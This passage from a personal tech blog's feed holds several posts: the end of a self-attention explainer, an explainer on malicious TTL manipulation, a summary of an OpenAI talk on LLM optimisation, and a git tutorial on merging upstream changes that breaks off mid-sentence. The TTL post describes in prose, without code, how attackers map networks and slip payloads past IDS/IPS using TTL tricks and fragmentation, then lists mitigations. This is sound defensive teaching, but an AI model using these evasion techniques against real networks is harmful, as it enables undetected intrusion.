future context, outputs might repeat or loop without a logical progression.</li> <li><em>Compromised Learning Objective:</em> The model’s focus shifts from generating text based on learned structures to merely matching patterns, diluting the essence of language generation.</li> </ul> <blockquote> <p><strong><em>The generation of each element of the output sequence one at a time is Auto-Regression.</em></strong></p> </blockquote> <p>Generated each element of the output one at a time, based on the previously generated elements, is known as <strong>Auto-Regression</strong>. The auto-regressive property necessitates the use of masked self-attention in the decoder, as it relies on the premise that each step in the generation process only has access to previous steps.</p> <p>In summary, decoders are <em>uni-directional</em> because their <em>self-attention</em> layer is masked. Masking supports the <em>auto-regressive</em> nature of the generation process, ensuring that each step in generating the output can only use information from the steps that have already occurred.</p> <p>Decoder-only models are particularly useful at generative tasks, like text generation.</p> <h2 id="encoders-decoders">Encoders-decoders</h2> <p>Are also known as <strong>sequence-to-sequence</strong>. These models are good for generative tasks that are based on an input, such as translation or summarisation.</p> <h1 id="self-attention-layers">Self-Attention Layers</h1> <p><strong>Attention layers</strong> refers to any layer within a neural network that applies some form of the <em>attention mechanism</em>. Attention mechanisms allow models to focus on different parts of the input data with varying degrees of emphasis.</p> <blockquote> <p><strong><em>Self-Attention is one type of attention mechanism.</em></strong></p> </blockquote> <p>Self-Attention in transformer models enables each position in the input sequence to attend to all positions within the same sequence. Self-Attention enables transformers to process and interpret sequences of input data, such as sentences in natural language processing (NLP) and dynamically weigh the relevance of all parts of the input data against every other part when processing any single part, enabling the incorporation of relatively weighted context from the entire sequence.</p> <p>In other words, self-attention allows a model to understand the relationships between words, regardless of their positional distance. Here’s a more detailed look at how self-attention works:</p> <p>For example, imagine the sentence: <em><code class="language-plaintext highlighter-rouge">The cat purrs.</code></em></p> <p><strong>Step 1 - Input representation</strong><br/> First, each word in the sentence (<em><code class="language-plaintext highlighter-rouge">The</code></em>, <em><code class="language-plaintext highlighter-rouge">cat</code></em>, <em><code class="language-plaintext highlighter-rouge">purrs</code></em>) is converted into a vector using embeddings. These vectors contain each word’s initial context.</p> <p><strong>Step 2 - Query, Key, and Value Vectors</strong><br/> For each word, three vectors are generated from its embedding: a Query vector (<code class="language-plaintext highlighter-rouge">Q</code>), a Key vector (<code class="language-plaintext highlighter-rouge">K</code>), and a Value vector (<code class="language-plaintext highlighter-rouge">V</code>). This is done through linear transformations, which essentially means multiplying the word’s embedding by different weight matrices for <code class="language-plaintext highlighter-rouge">Q</code>, <code class="language-plaintext highlighter-rouge">K</code>, and <code class="language-plaintext highlighter-rouge">V</code>.</p> <p><strong>Step 3 - Calculating attention scores</strong><br/> The “dot product” of the Query vector for <code class="language-plaintext highlighter-rouge">purrs</code> is calculated with the Key vector of every word in the sentence, including itself. Calculating the dot product with the Key vector (<code class="language-plaintext highlighter-rouge">K</code>) of every other word produces scores that represent how much attention <code class="language-plaintext highlighter-rouge">purrs</code> should pay to each word in the sentence, including <code class="language-plaintext highlighter-rouge">The</code> and <code class="language-plaintext highlighter-rouge">cat</code>.</p> <p><strong>Step 4 - Softmax to Determine Weights</strong><br/> These scores converted into weights that sum to 1 through a mathematical normalisation process (a softmax function). The weights quantify the relevance of each word’s information to the word <code class="language-plaintext highlighter-rouge">purrs</code>.</p> <p><strong>Step 5 - Weighted Sum and Output</strong><br/> The weights are used to create a weighted sum of the Value vectors, which incorporates information from the entire sentence into the representation of <code class="language-plaintext highlighter-rouge">purrs</code>. For instance, the high weight of <code class="language-plaintext highlighter-rouge">cat</code> (since it’s directly related to <code class="language-plaintext highlighter-rouge">purrs</code>) ensures that <code class="language-plaintext highlighter-rouge">purrs</code> is understood in the context of <em><code class="language-plaintext highlighter-rouge">The cat</code></em>, reinforcing that it’s the cat doing the purring.</p> <blockquote> <p><strong><em>The result is contextual representation.</em></strong></p> </blockquote> <p>Thanks to the self-attention mechanism, the output vector for “purrs” now contains information about the word itself and how it relates to the other words in the sentence.</p> <p>This process is repeated for every word, enabling the encoder to understand and represent each word in the context of the entire sentence. Through this mechanism, transformers achieve a deep understanding of the text, considering the meaning of individual words and their broader context within the sentence.</p> <p>So clever.</p> <h4 id="sources">Sources</h4> <ul> <li>Self-Attention is all you need</li> <li>Wikipedia</li> <li>Huggingface.co NLP Course</li> </ul>]]></content><author><name></name></author><category term="Artificial-Intelligence"/><category term="transformers"/><category term="transformer-architecture"/><category term="self-attention"/><category term="encoders"/><category term="decoders"/><category term="sequence-to-sequence"/><category term="encoder-decoder"/><category term="auto-regression"/><summary type="html"><![CDATA[A high-level explanation on Transformers and the role of self-attention.]]></summary></entry><entry><title type="html">Malicious Time-to-Live (TTL) manipulation</title><link href="https://emdeh.github.io/blog/2024/ttl-manipulation/" rel="alternate" type="text/html" title="Malicious Time-to-Live (TTL) manipulation"/><published>2024-03-15T23:50:00+00:00</published><updated>2024-03-15T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2024/ttl-manipulation</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/ttl-manipulation/"><![CDATA[<p>Threat actors can manipulate their IP packets’ Time-to-Live (TTL) value to evade detection while performing network reconnaissance and even help bypass firewalls, Intrusion Detection Systems (IDS), and Intrusion Prevention Systems (IPS).</p> <p>But first, what is TTL…</p> <h2 id="what-is-ttl">What is TTL</h2> <p>Time-to-live (TTL) is a mechanism used in computing to limit the lifespan or validity of data in a network. TTL is a value included in IP packets that tells a network router how many hops (transfers from one network segment to another) the packet is allowed before it should be discarded. The TTL value prevents data packets from circulating indefinitely and causing network congestion.</p> <p>TTL values are set in the header of IP packets. The TTL value is an 8-bit field, ranging from 0 to 255. The value set in this field determines the maximum number of routers (hops) the packet can pass through before it is discarded or dropped.</p> <p>The initial TTL value of a packet can vary depending on the operating system or the application generating the packet. Some common initial values used by different systems include: Linux-based systems - 64. Windows-based systems -128. Network equipment like Cisco routers -255.</p> <p>The choice of the initial TTL value is a balance between ensuring that packets have enough hops to reach their destination under normal conditions and preventing packets from circulating unnecessarily - an important feature to mitigate network congestion.</p> <h2 id="what-happens-when-the-ttl-reaches-0">What happens when the TTL reaches 0</h2> <p>When the TTL value of an IP packet decrements to 0, it indicates that the packet has reached the maximum allowed number of hops (routers) without reaching its intended destination. The router that decrements the TTL value to 0 will discard the packet and typically sends an ICMP (Internet Control Message Protocol) Time Exceeded message back to the source IP address. This ICMP message notifies the sender that the packet was not delivered due to the TTL expiring.</p> <h2 id="ttl-manipulation-for-reconnaissance-and-probing">TTL Manipulation for reconnaissance and probing</h2> <p>Intentionally manipulating the TTL with lower-than-normal values can be used in network reconnaissance. By controlling the TTL value, a threat actor can elicit the ICMP Time Exceeded response from various appliances on a network. These responses can help infer the overall layout, map network paths, or identify the presence and location of specific appliances.</p> <h2 id="bypassing-security-measures">Bypassing Security Measures</h2> <p>Another application of TTL manipulation involves deceiving IDS and IPS appliances to smuggle malicious packets past these security controls.</p> <p>This technique operates on the principle of sending two sets of packets with carefully selected TTL values and identical sequence numbers, exploiting the way some security devices handle packet inspection and filtering.</p> <h3 id="initial-probing-packets">Initial Probing Packets</h3> <p>The threat actor sends a series of packets towards the target system with TTL values calibrated such that they expire right before reaching the target, yet after passing the IDS/IPS. These packets, designed to appear benign, prompt the IDS/IPS to log their sequences but ultimately discard them as they do not reach the destination due to TTL expiry.</p> <h3 id="follow-up-malicious-packets">Follow-Up Malicious Packets</h3> <p>Subsequently, the attacker sends another set of packets with identical sequence numbers as the probing packets, but this time, containing a malicious payload. These packets are sent with TTL values that ensure they reach the target. The critical manipulation here lies in setting the TTL of the probing packets to expire just beyond the IDS/IPS, thus avoiding further inspection of the subsequent malicious packets.</p> <h3 id="the-idsips-deception">The IDS/IPS Deception</h3> <p>Many IDS/IPS configurations are optimised to reduce performance overhead, which includes minimising duplicate packet inspection. They might treat these follow-up packets as duplicates of the initial, already-checked sequence, thus not subjecting them to thorough scrutiny. Consequently, the packets carrying the malicious content bypass the IDS/IPS checks, reaching the target system unnoticed.</p> <h3 id="implications-for-security">Implications for Security</h3> <p>This advanced method illustrates the capacity for TTL manipulation in mapping network defences and its potential in crafting evasion strategies that exploit specific weaknesses in the security infrastructure’s logic and configuration.</p> <h2 id="incorporating-fragmentation-with-ttl-manipulation">Incorporating Fragmentation with TTL Manipulation</h2> <p>Another method combines packet fragmentation with TTL manipulation to evade security controls. This technique leverages the fact that some security devices may not thoroughly inspect or reassemble fragmented packets.</p> <p>By fragmenting malicious payloads and carefully setting the TTL values, attackers can craft packets that are less likely to be detected by traditional security mechanisms.</p> <p>Fragmenting packets involves dividing the malicious payload into smaller fragments, making it more challenging for security devices to identify and block the harmful content, as the payload isn’t contained within a single, easily inspectable packet.</p> <p>Alongside fragmentation, the attacker manipulates the TTL values to ensure that the fragmented packets bypass the security devices with minimal scrutiny. The manipulated TTL values can help ensure that the fragments take a path through the network that avoids comprehensive inspection or takes advantage of devices that do not reassemble packets for inspection.</p> <p>By carefully orchestrating the fragmentation and TTL settings, the attacker can potentially deliver the malicious payload past IDS, IPS, and firewalls. Once the fragments reach their target, they can be reassembled into the original malicious payload, executing the intended attack without being detected by the network’s security infrastructure.</p> <h2 id="mitigation-and-real-world-application">Mitigation and real-world application</h2> <p>The effectiveness of these techniques in real-world scenarios can significantly vary. Modern Intrusion Detection and Prevention Systems are designed to mitigate such evasion tactics.</p> <p>These systems often incorporate advanced algorithms and analysis of behaviour patterns to detect and counteract unusual TTL values and fragmented packet strategies.</p> <p>To enhance network security against such TTL manipulation techniques, administrators can consider the following mitigation strategies: Enhanced Packet Inspection: Configure IDS/IPS to perform in-depth packet inspections, including analysing fragmented packets and verifying packet integrity.</p> <ul> <li> <p><strong>Anomaly Detection:</strong> Implement anomaly-based detection systems that identify unusual traffic patterns, including atypical TTL values. Regular Updates and Patching: Keep security devices updated with the latest software patches and threat intelligence to defend against new and evolving tactics.</p> </li> <li> <p><strong>Comprehensive Security Practices:</strong> Employ a multi-layered security approach that includes encryption, firewalls, and end-to-end monitoring to reduce reliance on any single point of failure.</p> </li> </ul>]]></content><author><name></name></author><category term="Explainers"/><category term="IDS"/><category term="IPS"/><category term="TTL"/><category term="packet-fragmentation"/><category term="ICMP"/><category term="network-security"/><summary type="html"><![CDATA[A high-level explanation on malicious TTL manipulation and packet fragmentation.]]></summary></entry><entry><title type="html">Optimising LLM Performance</title><link href="https://emdeh.github.io/blog/2024/optimising-llm-performance/" rel="alternate" type="text/html" title="Optimising LLM Performance"/><published>2024-03-06T23:50:00+00:00</published><updated>2024-03-06T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2024/optimising-llm-performance</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/optimising-llm-performance/"><![CDATA[<h1 id="a-framework-for-understanding-optimisation">A Framework for understanding optimisation</h1> <p>The recent developer conference hosted by OpenAI offered a deep dive into enhancing the capabilities of Large Language Models (LLMs). The presenters, John and Colin shared their insights on optimising LLMs. You can watch the video <a href="https://youtu.be/ahnGLM-RC1Y?si=Y-Dfy5CPxGT79ZBQ">here</a>, and I encourage you to do so!</p> <p>Optimisation of base models can be a critical step on the path to Production. A base model may show promise in a specific application but may lack consistency in a desired behaviour or knowledge to warrant its deployment.</p> <p>The optimisation approach will depend on what aspect the model needs to improve. John and Colin from OpenAI propose two primary dimensions of optimisation. Is it the context that needs improvement; that is, what the model needs to know? Or is it the model itself that requires optimisation; that is, how it needs to act?</p> <p><img src="/assets/img/20243-llm-performance/graphic1.png" alt="graphic 1"/> <small><em>Graphic adapted from OpenAI’s presentation</em></small></p> <p>For example, a base-model LLM will fail at generating a report on the most recent market trends because - well, it doesn’t know the most recent market trends. Why? Because they were never present in its pre-trained knowledge. In cases like this, the model is said to need <em>context optimisation</em>.</p> <p>Base models might not consistently follow instructions when the model is required to output particular formats or styles or requires multiple steps or complex reasoning. Some examples of these use cases are generating code from natural language or extracting structured data from unstructured text. In these cases, the <em>model itself requires optimisation</em>.</p> <h1 id="using-the-framework-for-maximising-model-performance">Using the framework for maximising model performance</h1> <p>Understanding model optimisation in this framework can help identify whether the issue is a context problem or an action problem. Once this is understood, appropriate techniques can be applied.</p> <p>In the case of context optimisation, Retrieval Augmented Generation (RAG) is likely a good start. To optimise the LLM itself, consider fine-tuning.</p> <p>And, of course, in other cases, a mix of optimising how a model acts and what it knows will be required.</p> <p><img src="/assets/img/20243-llm-performance/graphic2.png" alt="graphic 2"/> <small><em>Graphic adapted from OpenAI’s presentation</em></small></p> <h2 id="first-start-with-prompt-engineering">First, start with prompt engineering.</h2> <p>In either case, starting with prompt engineering is the best way to start as it offers a quick way to test and learn what dimension should be optimised and sets a baseline for further improvements.</p> <p>This stage is as simple as starting with a prompt. Then, consider adding a few shot examples (for context issues) or employing few shot learning (for acting issues). If this yields improvements, you’ll have a good baseline from which to iterate further.</p> <h3 id="what-is-few-shot-examples">What is few-shot examples</h3> <p>Few-shot examples refer to the specific instances or data points that are used in the process of few-shot learning. These are the actual samples from which the model is expected to learn or generalise. In a practical sense, if you were providing a machine learning model with few-shot examples, you would be giving it a very limited number of examples per class from which it needs to learn.</p> <h3 id="what-is-few-shot-learning">What is few-shot learning</h3> <p>Few-shot learning, on the other hand, is the broader concept or methodology that involves training a model to accurately make predictions or understand new concepts with only a few examples. Few-shot learning is particularly relevant where the goal is to develop models that can generalise well from limited data — something that is especially challenging and important when large datasets are not available or when trying to improve model adaptability and efficiency.</p> <h2 id="is-it-a-context-issue">Is it a context issue?</h2> <p>Prompt engineering alone is unlikely to be sufficient in more complex use cases, and it doesn’t scale well (remember, we want a Production-grade solution).</p> <p>Optimising with RAG is a logical next step if prompt engineering has revealed a context issue. You can see <a href="https://emdeh.com/blog/2024/rag-llm-chatbot/">this article</a> for an overview of RAG (or <a href="https://youtu.be/ahnGLM-RC1Y?si=QKwCMVozmxdPsBcU&amp;t=712"> skip to this part of the video</a>).</p> <h3 id="retrieval-augmented-generation-rag">Retrieval Augmented Generation (RAG)</h3> <p>RAG is typically good for introducing new information to the model, updating its knowledge, and reducing hallucinations by controlling content. If done correctly, the model will act as if it is explicitly amnesic to everything it was trained on while still retaining its implicit intelligence. In other words, the only knowledge it explicitly has is what has been provided in the RAG implementation.</p> <h4 id="simple-retrieval">Simple retrieval</h4> <p>Adding a simple RAG retrieval will ground the model in the desired context source. A simple way to provide the model access to a repository from which it can pull data, for example, is through embeddings and cosine similarity algorithms.</p> <p><em>(Cosine similarity algorithms measure the cosine of the angle between two non-zero vectors in a multi-dimensional space, providing a metric for how similar these vectors are.)</em></p> <h4 id="other-rag-options">Other RAG options</h4> <p>Other, more advanced, RAG options include Hypothetical Document Embeddings(HyDE) (with a fact-checking step). HyDE is essentially a technique where, instead of using the question’s vector to search for answers with an embedding similarity, a HyDE implementation will employ contrastive methods and generate a “hypothetical” answer in response to the prompt and use that “made up” answer to search for context instead.</p> <p>HyDE techniques can be helpful in cases where the model will receive questions that lack specificity or easily identifiable elements, making it difficult to derive an answer from the integrated context source.</p> <p>HyDE won’t always yield good results. For example, if the question is about a topic that the LLM is unfamiliar with - such as some new concept that was not present in the pre-trained knowledge - then it will likely lead to an increase in inaccurate results and hallucinations. The reason is that if it doesn’t know anything about the topic, the hypothetical answer it created to retrieve context will have no basis in reality…a hallucination, in other words.</p> <p>This is probably why OpenAI presented HyDE in the video with the <em>+ fact-checking step</em>!</p> <h3 id="rag-evaluation">RAG evaluation</h3> <p>It’s important to remember that by adding RAG to a solution, there is now an entirely new bunch of things that can go wrong. As John points out in the video, LLMs already hallucinate all on their own. If the context the model uses to ground its responses is fundamentally or systematically flawed, understanding whether the solution fails because of the RAG integration or an inherently hallucinatory trait within the model will be challenging. For this reason, evaluation frameworks are crucial.</p> <p>The video mentions an open-source evaluation framework called R<a href="https://github.com/explodinggradients/ragas">Ragas from Exploding Gradients</a>. Ragas measures four metrics. Two evaluate how well the model answered the question (Generation), and two measure how relevant the content retrieved is to the question (Retrieval).</p> <p>The Generation metrics are:</p> <ul> <li><em>Faithfulness</em> - a measure of how factually accurate the answer is.</li> <li><em>Answer relevancy</em> - how relevant is the generated answer to what was asked.</li> </ul> <p>The Retrieval metrics are:</p> <ul> <li><em>Context precision</em> - The signal-to-noise ratio of retrieved context.</li> <li><em>Context recall</em> - Can it retrieve all the relevant information required to answer the question.</li> </ul> <p>Context precision is particularly useful because providing RAG implementation with more chunks of data potentially containing relevant context doesn’t always work. John mentions a paper, <a href="https://cs.stanford.edu/~nfliu/papers/lost-in-the-middle.arxiv2023.pdf"><em>Lost in the Middle: How Language Models Use Large Contexts</em></a>, which explains that the more content given, the more likely the model is to hallucinate because LLMs tend to “forget” the content in the middle of a chunk. Not surprisingly, this is reminiscent of the Serial Position Effect observed in human cognition, which is the tendency to remember the first and last items in a list better than those in the middle. This effect has been well-researched in psychological science and can form part of the basis for various cognitive biases.</p> <p>On the other hand, context recall helps to understand the utility of the search mechanism. A common misconception with RAG implementations is that it will always find the proper context. But there is a fundamental constraint to remember: how many tokens can that context window accept. If it were possible to pass the entire context source to the LLM for each prompt, then context recall would never be an issue. But the computing power required for even a modest context source would make this unviable.</p> <p>The missing piece to consider is that the prompt is parsed into some search function, and it is the search function that surfaces the (ostensibly) relevant context. It is this surfaced context that the LLM relies on. So, evaluating context recall will help identify if the search process is surfacing up the most relevant context. If not, the search function may need optimising, such as re-ranking or fine-tuning the embeddings.</p> <p><img src="/assets/img/20243-llm-performance/graphic3.png" alt="graphic 3"/> <small><em>Graphic adapted from OpenAI’s presentation</em></small></p> <h2 id="is-it-an-actions-issue">Is it an actions issue?</h2> <p>If the required optimisation is related to how the model needs to act, then fine-tuning will likely be a good approach. Fine-tuning <em>“continues the training process on a smaller domain-specific dataset to optimise a model for a specific task”.</em></p> <p>Fine-tuning is equivalent to taking a general knowledge worker and teaching them a specialised skill. It can drastically improve a model’s performance on a specific task while also making the fine-tuned model more efficient (on that specific task) when compared to its corresponding base model.</p> <p>Fine-tuning is often more effective than prompt engineering or few-shot learning because a much smaller token count inherently constrains these techniques. Only so much data can be put into the context window, whereas in fine-tuning, exposing the model to millions of tokens of specialised data is achieved relatively easily.</p> <p>In terms of model efficiency, fine-tuning provides a way to reduce the number of tokens otherwise needed to get the model to perform the specialised task. Often, there is no need to offer in-context examples or explicit schemas, which translates into saved tokens. Sometimes, it can also distil the specialised task into a model smaller than the base one from which it was derived. Again, this ultimately translates into saved resources.</p> <p>When fine-tuning, Colin suggests in the video to start with a simple dataset with no complex instructions, formal schemas or in-context examples. All that is needed is natural language descriptions and the desired structure of the output.</p> <h3 id="where-fine-tuning-excels">Where fine-tuning excels</h3> <p>Fine-tuning works well when it emphasises pre-existing knowledge within the model, is used to customise the structure or tone of the desired output, or fine-tunes a highly complex set of instructions. The example given in the video is that of a text-to-SQL task. Base models like GPT-3.5 and GPT-4 already know everything there is to know about SQL, but they might perform poorly if asked about an obscure dialect of SQL. Fine-tuning is equivalent to telling the model to emphasise those aspects of its already present knowledge.</p> <h3 id="where-it-wont-excel">Where it won’t excel</h3> <p>Fine-tuning will not work for teaching the model something new. And the reason can be thought of as the inverse of why fine-tuning excels in emphasising pre-existing knowledge. Consider how large the datasets are for some LLMs (like the-entirety-of-the-internet large). These training runs were so extensive that any attempt to use fine-tuning to inject new knowledge would be quickly lost in the pre-existing knowledge. If this is the objective, approaching the problem with RAG will be better.</p> <p>Lastly, fine-tuning is a slow, iterative process. There is a lot of investment in preparing data and training, so it isn’t great for quick iterations.</p> <h3 id="quality-over-quantity">Quality over quantity</h3> <p>It’s worth jumping to <a href="https://youtu.be/ahnGLM-RC1Y?si=mVBDUZtccM9RGH-t&amp;t=1929">this part of the video</a> for a humourous and cautionary tale on quality over quantity. In short, the takeaway from here is to ensure the fine-tuning data accurately represents the desired outcome; start small, confirm movement in the right direction, and then iterate from there.</p> <p>And if you think fine-tuning a model on 200,000 of your slack messsages is a good place to start, maybe consider that a little longer.</p> <h1 id="useful-resources">Useful resources</h1> <ul> <li><a href="https://youtu.be/ahnGLM-RC1Y?si=Y-Dfy5CPxGT79ZBQ">A Survey of Techniques for Maximizing LLM Performance (Original OpenAI video on which this afticle is based)</a></li> <li><a href="https://cs.stanford.edu/~nfliu/papers/lost-in-the-middle.arxiv2023.pdf">Lost in the Middle: How Language Models Use Large Contexts</a></li> </ul>]]></content><author><name></name></author><category term="Artificial-Intelligence"/><category term="RAG"/><category term="LLM"/><category term="retrieval-augmented-generation"/><category term="large-language-models"/><category term="few-shot-examples"/><category term="few-shot-learning"/><category term="ragas"/><category term="HyDE"/><category term="fine-tuning"/><category term="serial-position-effect"/><category term="lost-in-the-middle"/><summary type="html"><![CDATA[A discussion on a few techniques to maximise LLM performance]]></summary></entry><entry><title type="html">GitHub - Managing upstream changes</title><link href="https://emdeh.github.io/blog/2024/managing-upstream-changes/" rel="alternate" type="text/html" title="GitHub - Managing upstream changes"/><published>2024-02-19T23:50:00+00:00</published><updated>2024-02-19T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2024/managing-upstream-changes</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/managing-upstream-changes/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>When a GitHub repository is forked, it can maintain a connection with original codebase. The original is called the <strong>upstream</strong> repository or branch. This connection means that the forked repository can be modified as needed, but if there are also changes made to the original, such as new features, they can be integrated into the forked version.</p> <p>This article outlines the steps to pull changes from an upstream repository into forked version. Specifically, it outlines how to pull changes into a separate branch for testing and then how to <strong>merge</strong> those changes into the main branch of the fork after testing and resolving any conflicts.</p> <h2 id="high-level-workflow-for-merging-upstream-changes">High-level workflow for Merging Upstream Changes:</h2> <ol> <li> <p><strong>Creating a New Branch:</strong> When there are upstream changes to merge, create a new branch in the forked repository based on the main branch.</p> </li> <li> <p><strong>Pulling Upstream Changes:</strong> Pull the changes from the upstream repository into this new branch. Resolve any conflicts here.</p> </li> <li> <p><strong>Testing:</strong> Use this branch to test the deployment to ensure everything works as expected. For example, if it’s a website, run it locally from the new branch or if it’s a deployment, deploy from the branch to confirm everything is in order.</p> </li> <li> <p><strong>Creating a Pull Request:</strong> Once the branch with the upstream changes has been tested, create a pull request to merge this branch into the main branch. The Pull Request can be drafted during testing if necessary.</p> </li> <li> <p><strong>Review and Merge:</strong> Review the Pull Request in GitHub. After any neccessary approvals, merge the pull request.</p> </li> <li> <p><strong>Delete the Branch:</strong> After the merge, the branch used to test the upstream changes can be deleted.</p> </li> </ol> <h2 id="prerequisites">Prerequisites</h2> <ul> <li>Ensure Git is installed on the system.</li> <li>Ensure access to the repository and its upstream repository.</li> </ul> <h1 id="steps">Steps</h1> <h2 id="1-navigate-to-the-local-repo">1. Navigate to the local repo</h2> <h2 id="2-update-the-local-main-branch">2. Update the local main branch</h2> <p>Ensure the local <code class="language-plaintext highlighter-rouge">main</code> branch (or whichever branch will ultimately receive the tested upstream changes) is up to date with the remote repository.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git checkout main <span class="c"># Checkout the local copy of the main branch</span>
git pull origin main <span class="c"># Pull remote changes into the local copy of the main branch</span>
</code></pre></div></div> <h2 id="3-fetch-changes-from-upstream-repository">3. Fetch changes from upstream repository</h2> <p>Fetch changes from the upstream repository without merging them.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git fetch upstream
</code></pre></div></div> <h2 id="4-create-a-new-branch-for-testing-the-upstream-changes">4. Create a new branch for testing the upstream changes</h2> <p>Create a new branch based on the <code class="language-plaintext highlighter-rouge">main</code> branch to test the upstream changes.</p> <blockquote> <p><strong><em>This is important, as it protects the stability of the branch from which the code is deployed.</em></strong></p> </blockquote> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git checkout <span class="nt">-b</span> upstream-changes main <span class="c"># Create a new branch called upstream-changes based off the main branch</span>
</code></pre></div></div> <h2 id="5-merge-upstream-changes-into-the-new-branch">5. Merge upstream changes into the new branch</h2> <p>Merge the changes from the upstream repository into the new branch.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git merge upstream/main
</code></pre></div></div> <h3 id="resolving-merge-conflicts">Resolving merge conflicts</h3> <p>If there are merge conflicts, Git will pause the merge process and mark the files that have conflicts. Here is how to resolve them:</p> <ul> <li>Open the conflicted files in VS Code.</li> <li>Look for the areas marked as conflicts (usually indicated by <code class="language-plaintext highlighter-rouge">&lt;&lt;&lt;&lt;&lt;&lt;</code>, <code class="language-plaintext highlighter-rouge">======</code>, and <code class="language-plaintext highlighter-rouge">&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>).</li> <li>Manually edit the files to resolve the conflicts. Choose which changes to keep or combine as needed.</li> <li>After resolving conflicts, add the files to staging: <code class="language-plaintext highlighter-rouge">git add .</code></li> <li>Then, continue the merge process: <code class="language-plaintext highlighter-rouge">git merge --continue</code></li> <li>Once all conflicts are resolved and the merge is successful, proceed with the next steps.</li> </ul> <h2 id="6-push-the-new-branch-to-github">6. Push the new branch to Github</h2> <p>It’s good practice to push the newly created branch with the upstream changes to the remote repository.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git push origin upstream-changes
</code></pre></div></div> <h2 id="7-open-a-pull-request-in-github">7. Open a Pull Request in GitHub</h2> <p>Now the Pull Request can be opened in draft.</p> <blockquote> <p><em>Be careful that the Pull Request is proposing to pull the <code class="language-plaintext highlighter-rouge">upstream-changes</code> branch into your own <code class="language-plaintext highlighter-rouge">main</code> branch, and <strong>*not</strong></em> the <code class="language-plaintext highlighter-rouge">main</code> branch of the upstream repository.*</p> </blockquote> <ul> <li>Go to the repository in GitHub.</li> <li>Open a Pull Request for the <code class="language-plaintext highlighter-rouge">upstream-changes</code> branch against the <code class="language-plaintext highlighter-rouge">main</code> branch.</li> <li>This usually initiates any review process.</li> </ul> <blockquote> <p><em>Do not merge it yet.</em></p> </blockquote> <h2 id="8-deploy-the-test-branch">8. Deploy the Test branch</h2> <p>Deploy or run the <code class="language-plaintext highlighter-rouge">upstream-changes</code> branch locally, or undertake whatever steps required to confirm the changes.</p> <h2 id="9-review-and-merge-the-pull-request">9. Review and merge the pull request</h2> <p>If the tests are successful, merge the changes into main by merging the pull request into the <code class="language-plaintext highlighter-rouge">main</code> branch through the GitHub interface.</p> <h3 id="when-to-use-merge-commit">When to use Merge Commit</h3> <p>Opt for a merge commit when you want to preserve the exact history of changes, including the individual commits, from a feature branch without altering the commit history. This approach is beneficial when you want to maintain a visual representation of the feature branch within the main branch, making it easier to track and understand the flow of changes. It’s especially useful for complex features or significant changes that involve multiple developers or require detailed historical context for future reference.</p> <p>The merge commit approach adds a new commit to the main branch that “merges” the histories, ensuring that the main branch’s history reflects the addition of the feature or changes from the feature branch as a merge. This method keeps the history of both branches intact and provides a clear merge point that can be referenced in the future</p> <blockquote> <p><em>If Linear History is on and the branch being being merged into is protected, the only options may be <strong>Rebase</strong> or <strong>Squash</strong>.</em></p> </blockquote> <h3 id="when-to-use-rebase">When to use Rebase</h3> <p>Use this when you want to maintain a detailed commit history from the feature/test branch in the main branch. It’s suitable for code changes where each commit’s history is important for context, such as new features or significant code revisions.</p> <h3 id="when-to-use-squash">When to use Squash</h3> <p>Opt for this when dealing with a series of minor or incremental changes, such as documentation updates or small tweaks. It combines all feature branch commits into a single commit for a cleaner main branch history, making it ideal for simpler or less impactful changes.</p> <h2 id="10-update-the-local-main-branch-and-clean-up">10. Update the local main branch and clean up</h2> <p>After merging the pull request, update the local <code class="language-plaintext highlighter-rouge">main</code> branch and then delete the test branch.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git checkout main <span class="c"># Switch back to the main branch</span>
git pull origin main <span class="c"># Pull the remote version of main to the local copy so it is up-to-date with the recent merge</span>
git branch <span class="nt">-d</span> upstream-changes <span class="c"># Delete the local copy of the branch used to test the upstream changes</span>
git push origin <span class="nt">--delete</span> upstream-changes <span class="c"># Delete the remote copy of the branch used to test the upstream changes</span>
</code></pre></div></div> <h2 id="11-redeploy-from-main">11. Redeploy from main</h2> <p>If required, it’s good practice to now re-deploy the codebase from the <code class="language-plaintext highlighter-rouge">main</code> branch.</p> <h1 id="conclusion">Conclusion</h1> <p>This process ensures that changes from the upstream repository are tested in isolation before being integrated into the main branch, minimising the risk of disruption to the main codebase.</p> <h5 id="a-quick-note-on-git-fetch-vs-git-pull">A quick note on <code class="language-plaintext highlighter-rouge">Git Fetch</code> vs. <code class="language-plaintext highlighter-rouge">Git Pull</code></h5> <p>In Git, both <code class="language-plaintext highlighter-rouge">git fetch</code> and <code class="language-plaintext highlighter-rouge">git pull</code> are commands used to update local copies of a repository from a remote source. However, they serve different purposes and operate in distinct ways.</p> <ul> <li> <p><strong><code class="language-plaintext highlighter-rouge">git fetch</code></strong> retrieves updates from a remote repository, but it doesn’t automatically merge those updates into the current working branch. When <code class="language-plaintext highlighter-rouge">git fetch upstream</code> is executed, for instance, Git fetches any new work that has been pushed to the upstream repository since the last fetch, updating the local remote-tracking branches (like upstream/main). However, <em>the working directory remains unchanged</em>. This command is useful for reviewing changes before integrating them into the local branch.</p> </li> <li> <p><strong><code class="language-plaintext highlighter-rouge">git pull</code></strong>, on the other hand, is a more aggressive command that not only fetches updates from the remote repository but also automatically merges them into your current working branch. Essentially, <code class="language-plaintext highlighter-rouge">git pull</code> is a combination of <code class="language-plaintext highlighter-rouge">git fetch</code> followed by <code class="language-plaintext highlighter-rouge">git merge</code>. When executed <code class="language-plaintext highlighter-rouge">git pull origin main</code>, Git fetches the changes from the main branch of the remote named origin and immediately attempts to merge them into the current working branch. This command is handy for quickly updating local branches with the latest changes from the remote, assuming they’re ready to be merged without a review process.</p> </li> </ul> <p>In Summary <code class="language-plaintext highlighter-rouge">git fetch</code> is when the changes require review before merging. Use <code class="language-plaintext highlighter-rouge">git pull</code> when integrating the remote changes immediately into the local branch without a preliminary review is not a 